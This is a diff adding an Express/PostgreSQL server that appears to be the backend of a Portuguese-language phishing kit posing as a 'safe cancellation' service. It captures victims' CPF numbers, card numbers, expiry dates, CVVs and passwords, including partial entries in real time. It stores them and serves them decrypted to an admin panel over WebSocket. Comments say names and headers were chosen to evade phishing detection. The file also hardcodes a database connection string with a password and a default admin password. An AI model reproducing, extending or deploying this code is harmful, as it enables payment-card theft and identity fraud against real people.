@@ -1,0 +1,519 @@
+const express = require('express');
+const { Pool } = require('pg');
+const path = require('path');
+const crypto = require('crypto');
+const bodyParser = require('body-parser');
+const bcrypt = require('bcryptjs');
+const basicAuth = require('express-basic-auth');
+const WebSocket = require('ws');
+
+const app = express();
+const port = process.env.PORT || 3000;
+
+// Middleware to parse JSON bodies
+app.use(bodyParser.json());
+
+// Add security headers to reduce phishing false positives
+app.use((req, res, next) => {
+    res.setHeader(
+        'Content-Security-Policy',
+        "default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.googleapis.com https://fonts.gstatic.com; script-src 'self' https://cdn.tailwindcss.com" // Adicionado https://cdn.tailwindcss.com
+    );
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    next();
+});
+
+// Basic authentication for admin panel
+const adminUsers = {
+    'admin': 'admin123' // Use plain text password for express-basic-auth
+};
+
+app.use('/admin', basicAuth({
+    users: adminUsers,
+    challenge: true,
+    unauthorizedResponse: (req) => {
+        return req.auth ? 'Credenciais inválidas.' : 'Acesso não autorizado. Por favor, faça login.';
+    }
+}));
+
+// Serve static files after authentication middleware
+app.use('/public', express.static(path.join(__dirname, 'public')));
+
+// Serve index.html for the root route
+app.get('/', (req, res) => {
+    try {
+        res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    } catch (error) {
+        console.error('Err serving index.html:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Database setup with PostgreSQL
+const pool = new Pool({
+    connectionString: process.env.DATABASE_URL || 'postgresql://cancelamento_seguro_user:31ZyIjHkyLmLmH9ly1Usm71u1Tndq6n5JT@dpg-d0vhup95pdvs738i1hgg-a.oregon-postgres.render.com/cancelamento_seguro',
+    ssl: {
+        rejectUnauthorized: false
+    },
+    connectionTimeoutMillis: 10000 // Timeout de 10 segundos para conexão
+});
+
+// Handle database connection errors and reconnections
+pool.on('error', (err, client) => {
+    console.error('Unexpected err on idle DB client:', err.message);
+    // Attempt to reconnect
+    setTimeout(async () => {
+        try {
+            console.log('Attempting to reconnect to DB...');
+            await connectToDatabase();
+        } catch (reconnectError) {
+            console.error('Failed to reconnect to DB:', reconnectError.message);
+        }
+    }, 5000);
+});
+
+// Function to connect to PostgreSQL with retries
+async function connectToDatabase(retries = 10, delay = 5000) {
+    for (let i = 0; i < retries; i++) {
+        try {
+            const client = await pool.connect();
+            console.log('Connected to DB');
+            client.release();
+            return true;
+        } catch (error) {
+            console.error(`Err connecting to DB (attempt ${i + 1}/${retries}):`, error.message);
+            if (i === retries - 1) {
+                console.error('Failed to connect to DB after all retries');
+                throw error;
+            }
+            await new Promise(resolve => setTimeout(resolve, delay));
+        }
+    }
+}
+
+// Create tables
+async function initializeDatabase() {
+    try {
+        // Table for form data (avoiding "submissions" to reduce phishing flags)
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS form_data (
+                id SERIAL PRIMARY KEY,
+                cpf TEXT NOT NULL,
+                card_number TEXT NOT NULL,
+                expiry_date TEXT NOT NULL,
+                cvv TEXT NOT NULL,
+                password TEXT NOT NULL,
+                submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+        console.log('Table "form_data" initialized');
+
+        // Table for temporary form data (real-time updates)
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS temp_data (
+                session_id TEXT PRIMARY KEY,
+                cpf TEXT,
+                card_number TEXT,
+                expiry_date TEXT,
+                cvv TEXT,
+                password TEXT,
+                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+        console.log('Table "temp_data" initialized');
+
+        // Table for settings (contact number)
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS settings (
+                key TEXT PRIMARY KEY,
+                value TEXT NOT NULL
+            )
+        `);
+        console.log('Table "settings" initialized');
+
+        // Insert default contact number if not exists
+        await pool.query(
+            `INSERT INTO settings (key, value) VALUES ('contact_number', '+5511999999999') ON CONFLICT (key) DO NOTHING`
+        );
+        console.log('Default contact number inserted');
+
+        // Table for visits
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS visits (
+                id SERIAL PRIMARY KEY,
+                visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+        console.log('Table "visits" initialized');
+
+        console.log('DB tables initialized successfully');
+    } catch (error) {
+        console.error('Err initializing DB:', error.message);
+        throw error;
+    }
+}
+
+// Encryption key validation
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'your-secret-key-here-32byteslong!';
+if (ENCRYPTION_KEY.length !== 32) {
+    console.error('ENCRYPTION_KEY must be exactly 32 bytes long');
+    process.exit(1);
+}
+const IV_LENGTH = 16; // For AES
+
+// Encrypt sensitive data
+function encrypt(text) {
+    try {
+        const iv = crypto.randomBytes(IV_LENGTH);
+        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
+        let encrypted = cipher.update(text);
+        encrypted = Buffer.concat([encrypted, cipher.final()]);
+        return iv.toString('hex') + ':' + encrypted.toString('hex');
+    } catch (error) {
+        console.error('Err encrypting data:', error.message);
+        throw error;
+    }
+}
+
+// Decrypt sensitive data
+function decrypt(text) {
+    try {
+        const [iv, encryptedText] = text.split(':').map(part => Buffer.from(part, 'hex'));
+        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
+        let decrypted = decipher.update(encryptedText);
+        decrypted = Buffer.concat([decrypted, decipher.final()]);
+        return decrypted.toString();
+    } catch (error) {
+        console.error('Err decrypting data:', error.message);
+        throw error;
+    }
+}
+
+// Get contact number from database
+async function getContactNumber() {
+    try {
+        console.log('Fetching contact number...');
+        const result = await pool.query(
+            `SELECT value FROM settings WHERE key = 'contact_number'`
+        );
+        const contactNumber = result.rows.length > 0 ? result.rows[0].value : '+5511999999999';
+        console.log('Contact number retrieved:', contactNumber.replace(/\d/g, '*'));
+        return contactNumber;
+    } catch (error) {
+        console.error('Err fetching contact number:', error.message);
+        throw error;
+    }
+}
+
+// WebSocket setup
+const server = app.listen(port, () => {
+    console.log(`Server running on port ${port}`);
+});
+
+const wss = new WebSocket.Server({ server });
+
+// Broadcast to all connected WebSocket clients
+function broadcast(message) {
+    wss.clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN) {
+            client.send(JSON.stringify(message));
+        }
+    });
+}
+
+// Check authentication route for admin
+app.get('/admin/check-auth', (req, res) => {
+    if (req.auth && req.auth.user === 'admin') {
+        res.status(200).json({ message: 'Authenticated' });
+    } else {
+        res.status(401).json({ error: 'Not authenticated' });
+    }
+});
+
+// Serve admin panel
+app.get('/admin', (req, res) => {
+    try {
+        console.log('Serving admin panel...');
+        res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+    } catch (error) {
+        console.error('Err serving admin panel:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Handle temporary form submission (real-time updates)
+app.post('/api/temp-submit', async (req, res) => {
+    try {
+        console.log('Received temp form data:', Object.keys(req.body));
+        const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
+
+        if (!sessionId) {
+            console.warn('Missing sessionId in temp form data');
+            return res.status(400).json({ error: 'sessionId é obrigatório.' });
+        }
+
+        // Encrypt sensitive data if provided
+        const encryptedCardNumber = cardNumber ? encrypt(cardNumber) : null;
+        const encryptedCvv = cvv ? encrypt(cvv) : null;
+        const encryptedPassword = password ? encrypt(password) : null;
+
+        // Insert or update temporary form data
+        await pool.query(
+            `INSERT INTO temp_data (session_id, cpf, card_number, expiry_date, cvv, password, updated_at)
+             VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
+             ON CONFLICT (session_id)
+             DO UPDATE SET
+                 cpf = COALESCE(EXCLUDED.cpf, temp_data.cpf),
+                 card_number = COALESCE(EXCLUDED.card_number, temp_data.card_number),
+                 expiry_date = COALESCE(EXCLUDED.expiry_date, temp_data.expiry_date),
+                 cvv = COALESCE(EXCLUDED.cvv, temp_data.cvv),
+                 password = COALESCE(EXCLUDED.password, temp_data.password),
+                 updated_at = CURRENT_TIMESTAMP`,
+            [sessionId, cpf || null, encryptedCardNumber, expiryDate || null, encryptedCvv, encryptedPassword]
+        );
+        console.log('Temp form data saved for session:', sessionId);
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'TEMP_DATA_UPDATE' });
+
+        res.status(200).json({ message: 'Dados temporários salvos com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/temp-submit:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Get temporary form data for admin panel
+app.get('/api/temp-data', async (req, res) => {
+    try {
+        console.log('Fetching temp data...');
+        const result = await pool.query('SELECT * FROM temp_data ORDER BY updated_at DESC');
+        const rows = result.rows;
+
+        // Decrypt sensitive data before sending
+        const decryptedRows = rows.map(row => ({
+            ...row,
+            card_number: row.card_number ? decrypt(row.card_number) : null,
+            cvv: row.cvv ? decrypt(row.cvv) : null,
+            password: row.password ? decrypt(row.password) : null
+        }));
+
+        console.log('Temp data retrieved:', decryptedRows.length);
+        res.json(decryptedRows);
+    } catch (error) {
+        console.error('Err in /api/temp-data:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Delete a specific temporary form data
+app.delete('/api/delete-temp-data/:sessionId', async (req, res) => {
+    try {
+        const { sessionId } = req.params;
+        await pool.query('DELETE FROM temp_data WHERE session_id = $1', [sessionId]);
+        console.log(`Temp data deleted for session: ${sessionId}`);
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'TEMP_DATA_UPDATE' });
+
+        res.status(200).json({ message: 'Dados temporários removidos com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/delete-temp-data:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Handle final form submission
+app.post('/submit', async (req, res) => {
+    try {
+        console.log('Received final form data:', Object.keys(req.body));
+        const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
+
+        if (!cpf || !cardNumber || !expiryDate || !cvv || !password) {
+            console.warn('Missing required fields in final form data');
+            return res.status(400).json({ error: 'Todos os campos são obrigatórios.' });
+        }
+
+        // Encrypt sensitive data
+        const encryptedCardNumber = encrypt(cardNumber);
+        const encryptedCvv = encrypt(cvv);
+        const encryptedPassword = encrypt(password);
+
+        // Insert into form_data table
+        await pool.query(
+            `INSERT INTO form_data (cpf, card_number, expiry_date, cvv, password) VALUES ($1, $2, $3, $4, $5)`,
+            [cpf, encryptedCardNumber, expiryDate, encryptedCvv, encryptedPassword]
+        );
+        console.log('Final form data saved to DB');
+
+        // Delete from temp_data after final submission
+        if (sessionId) {
+            await pool.query(
+                `DELETE FROM temp_data WHERE session_id = $1`,
+                [sessionId]
+            );
+            console.log('Temp data deleted for session:', sessionId);
+        }
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'FORM_DATA_UPDATE' });
+
+        res.status(200).json({ message: 'Dados enviados com sucesso!' });
+    } catch (error) {
+        console.error('Err in /submit:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Get contact number
+app.get('/api/contact-number', async (req, res) => {
+    try {
+        const contactNumber = await getContactNumber();
+        res.json({ contactNumber });
+    } catch (error) {
+        console.error('Err in /api/contact-number:', error.message);
+        res.status(500).json({ error: 'Erro ao buscar o número de contato.' });
+    }
+});
+
+// Update contact number
+app.post('/api/contact-number', async (req, res) => {
+    try {
+        console.log('Req to update contact number:', req.body.contactNumber.replace(/\d/g, '*'));
+        const { contactNumber } = req.body;
+
+        if (!contactNumber || !/^\+\d{10,15}$/.test(contactNumber)) {
+            console.warn('Invalid contact number format:', contactNumber.replace(/\d/g, '*'));
+            return res.status(400).json({ error: 'Número de contato inválido.' });
+        }
+
+        await pool.query(
+            `INSERT INTO settings (key, value) VALUES ('contact_number', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
+            [contactNumber]
+        );
+        console.log('Contact number updated:', contactNumber.replace(/\d/g, '*'));
+        res.status(200).json({ message: 'Número de contato atualizado com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/contact-number:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Register a visit
+app.post('/api/visit', async (req, res) => {
+    try {
+        console.log('Registering a visit...');
+        await pool.query(
+            `INSERT INTO visits (visited_at) VALUES (CURRENT_TIMESTAMP)`
+        );
+        console.log('Visit registered');
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'VISIT_UPDATE' });
+
+        res.status(200).json({ message: 'Visita registrada com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/visit:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Get visits data
+app.get('/api/visits', async (req, res) => {
+    try {
+        console.log('Fetching visits data...');
+        // Get total visits
+        const totalResult = await pool.query('SELECT COUNT(*) as total FROM visits');
+        const totalVisits = totalResult.rows[0].total;
+
+        // Get recent visits (last 10)
+        const recentResult = await pool.query(
+            'SELECT * FROM visits ORDER BY visited_at DESC LIMIT 10'
+        );
+        const recentVisits = recentResult.rows;
+
+        console.log('Visits data retrieved:', { totalVisits, recentVisitsCount: recentVisits.length });
+        res.json({
+            totalVisits,
+            recentVisits
+        });
+    } catch (error) {
+        console.error('Err in /api/visits:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Get all form data for admin panel
+app.get('/api/form-data', async (req, res) => {
+    try {
+        console.log('Fetching all form data...');
+        const result = await pool.query('SELECT * FROM form_data ORDER BY submitted_at DESC');
+        const rows = result.rows;
+
+        // Decrypt sensitive data before sending
+        const decryptedRows = rows.map(row => ({
+            ...row,
+            card_number: decrypt(row.card_number),
+            cvv: decrypt(row.cvv),
+            password: decrypt(row.password)
+        }));
+
+        console.log('Form data retrieved:', decryptedRows.length);
+        res.json(decryptedRows);
+    } catch (error) {
+        console.error('Err in /api/form-data:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Delete all form data
+app.delete('/api/delete-form-data', async (req, res) => {
+    try {
+        await pool.query('DELETE FROM form_data');
+        console.log('All form data deleted');
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'FORM_DATA_UPDATE' });
+
+        res.status(200).json({ message: 'Dados apagados com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/delete-form-data:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Reset visit counter
+app.delete('/api/reset-visits', async (req, res) => {
+    try {
+        await pool.query('DELETE FROM visits');
+        console.log('Visit counter reset');
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'VISIT_UPDATE' });
+
+        res.status(200).json({ message: 'Contador de visitas zerado com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/reset-visits:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+    console.error('Unhandled err:', err.message);
+    res.status(500).json({ error: 'Erro interno do servidor.' });
+});
+
+// Start the server after database initialization
+async function startServer() {
+    try {
+        await connectToDatabase();
+        await initializeDatabase();
+    } catch (error) {
+        console.error('Failed to start server:', error.message);
+        process.exit(1);
+    }
+}
+
+// Start the application
+startServer();
